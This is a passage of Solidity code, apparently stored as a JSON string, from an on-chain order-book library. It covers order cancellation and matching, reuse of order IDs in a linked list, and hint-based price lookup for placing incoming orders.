orders[asset][orders[asset][id].nextId].prevId = orders[asset][id].prevId;\n        orders[asset][orders[asset][id].prevId].nextId = orders[asset][id].nextId;\n\n        // create the links using the other side of the HEAD\n        emit Events.CancelOrder(asset, id, orders[asset][id].orderType);\n        _reuseOrderIds(orders, asset, id, prevHEAD, O.Cancelled);\n    }\n\n    /**\n     * @notice moves the matched id to the prev side of HEAD\n     * @dev this is how an id gets re-used\n     *\n     * @param orders the order mapping\n     * @param asset The market that will be impacted\n     * @param id ID of most recent matched order\n     *\n     */\n    function matchOrder(\n        mapping(address => mapping(uint16 => STypes.Order)) storage orders,\n        address asset,\n        uint16 id\n    ) internal {\n        uint16 prevHEAD = orders[asset][Constants.HEAD].prevId;\n        _reuseOrderIds(orders, asset, id, prevHEAD, O.Matched);\n    }\n\n    // shared function for both canceling and order and matching an order\n    function _reuseOrderIds(\n        mapping(address => mapping(uint16 => STypes.Order)) storage orders,\n        address asset,\n        uint16 id,\n        uint16 prevHEAD,\n        O cancelledOrMatched\n    ) private {\n        // matching ID1 and ID2\n        // BEFORE: HEAD <- <---------------- HEAD <-> (ID1) <-> (ID2) <-> (ID3) <-> NEXT\n        // AFTER1: HEAD <- [ID1] <---------- HEAD <-----------> (ID2) <-> (ID3) <-> NEXT\n        // AFTER2: HEAD <- [ID1] <- [ID2] <- HEAD <---------------------> (ID3) <-> NEXT\n\n        // @dev mark as cancelled instead of deleting the order itself\n        orders[asset][id].orderType = cancelledOrMatched;\n        orders[asset][Constants.HEAD].prevId = id;\n        // Move the cancelled ID behind HEAD to re-use it\n        // note: C_IDs (cancelled ids) only need to point back (set prevId, can retain nextId)\n        // BEFORE: .. C_ID2 <- C_ID1 <--------- HEAD <-> ... [ID]\n        // AFTER1: .. C_ID2 <- C_ID1 <- [ID] <- HEAD <-> ...\n        if (prevHEAD != Constants.HEAD) {\n            orders[asset][id].prevId = prevHEAD;\n        } else {\n            // if this is the first ID cancelled\n            // HEAD.prevId needs to be HEAD\n            // and one of the cancelled id.prevID should point to HEAD\n            // BEFORE: HEAD <--------- HEAD <-> ... [ID]\n            // AFTER1: HEAD <- [ID] <- HEAD <-> ...\n            orders[asset][id].prevId = Constants.HEAD;\n        }\n    }\n\n    /**\n     * @notice Helper function for finding the (previous) id so that an incoming\n     * @notice order can be placed onto the correct market.\n     * @notice Uses hintId if possible, otherwise fallback to traversing the\n     * @notice list of orders starting from HEAD\n     *\n     * @param orders the order mapping\n     * @param asset The market that will be impacted\n     * @param incomingOrder the Order to be placed\n     * @param hintId Id used to optimize finding the place to insert into ob\n     */\n\n    function findPrevOfIncomingId(\n        mapping(address => mapping(uint16 => STypes.Order)) storage orders,\n        address asset,\n        STypes.Order memory incomingOrder,\n        uint16 hintId\n    ) internal view returns (uint16) {\n        uint16 nextId = orders[asset][hintId].nextId;\n\n        // if invalid hint (if the id points to 0 then it's an empty id)\n        if (hintId == 0 || nextId == 0) {\n            return getOrderId(\n                orders,\n                asset,\n                Constants.NEXT,\n                Constants.HEAD,\n                incomingOrder.price,\n                incomingOrder.orderType\n            );\n        }\n\n        // check if the hint is valid\n        int256 direction = verifyId(\n            orders, asset, hintId, incomingOrder.price, nextId, incomingOrder.orderType\n        );\n\n        // if its 0, it's correct\n        // otherwise it could be off because a tx could of modified state\n        // so search in a direction based on price.\n        if (direction == Constants.EXACT) {\n            return hintId;\n        } else if (direction == Constants.NEXT) {\n            return getOrderId(\n                orders,\n                asset,\n                Constants.NEXT,\n                nextId,\n                incomingOrder.price,\n                incomingOrder.orderType\n            );\n        } else {\n            uint16 prevId = orders[asset][hintId].prevId;\n            return getOrderId(\n                orders,\n                asset,\n                Constants.PREV,\n                prevId,\n                incomingOrder.price,\n                incomingOrder.orderType\n            );\n        }\n    }\n\n    /**\n     * @notice Verifies that an id is between two id based on price and orderType\n     *\n     * @param asset The market that will be impacted\n     * @param prevId The first id supposedly preceding the new price\n     * @param newPrice price of prospective order\n     * @param nextId The first id supposedly following the new price\n     * @param orderType order type (bid, ask, short)\n     *\n     * @return direction int direction to search (PREV, EXACT, NEXT)\n     */\n    function verifyId(\n        mapping(address => mapping(uint16 => STypes.Order)) storage orders,\n        address asset,\n        uint16 prevId,\n        uint256 newPrice,\n        uint16 nextId,\n        O orderType\n    ) internal view returns (int256 direction) {\n        orderType = normalizeOrderType(orderType);\n\n        if (orderType == O.LimitAsk || orderType == O.LimitShort) {\n            return verifySellId(orders, asset, prevId, newPrice, nextId);\n        } else if (orderType == O.LimitBid) {\n            return verifyBidId(asset, prevId, newPrice, nextId);\n        }\n    }\n\n    // @dev not used to change state, just which methods to call\n    function normalizeOrderType(O o) private pure returns (O newO) {\n        if (o == O.LimitBid || o == O.MarketBid) {\n            return O.LimitBid;\n        } else if (o == O.LimitAsk || o == O.MarketAsk) {\n            return O.LimitAsk;\n        } else if (o == O.LimitShort) {\n            return O.LimitShort;\n        }\n    }\n\n    /**\n     * @notice Helper function for finding and returning id of potential order\n     *\n     * @param orders the order mapping\n     * @param asset The market that will be impacted\n     * @param direction int direction to search (PREV, EXACT, NEXT)\n     * @param hintId hint id\n     * @param _newPrice price of prospective order used to find the id\n     * @param orderType which OrderType to verify\n     */\n\n    function getOrderId(\n        mapping(address => mapping(uint16 => STypes.Order)) storage orders,\n        address asset,\n        int256 direction,\n        uint16 hintId,\n        uint256 _newPrice,\n        O orderType\n    ) internal view returns (uint16 _hintId) {\n        while (true) {\n            uint16 nextId = orders[asset][hintId].nextId;\n\n            if (\n                verifyId(orders, asset, hintId, _newPrice, nextId, orderType)\n                    == Constants.EXACT\n            ) {\n                return hintId;\n            }\n\n            if (direction == Constants.PREV) {\n                uint16 prevId = orders[asset][hintId].prevId;\n                hintId = prevId;\n            } else {\n                hintId = nextId;\n            }\n        }\n    }\n\n    /**\n     * @notice Helper function for updating the bids mapping when matched\n     * @dev More efficient way to remove matched orders. Instead\n     * @dev Instead of canceling each one, just wait till the last match and only swap prevId/nextId there, since the rest are gone\n     *\n     * @param orders The market that will be impacted\n     * @param asset The market that will be impacted\n     * @param id Most recent matched Bid\n     * @param isOrderFullyFilled Boolean to see if full or partial\n     */\n    function updateBidOrdersOnMatch(\n        mapping(address => mapping(uint16 => STypes.Order)) storage orders,\n        address asset,\n        uint16 id,\n        bool isOrderFullyFilled\n    ) internal {\n        // BEFORE: HEAD <-> ... <-> (ID) <-> NEXT\n        // AFTER : HEAD <------------------> NEXT\n        if (isOrderFullyFilled) {"
    }
  ]
}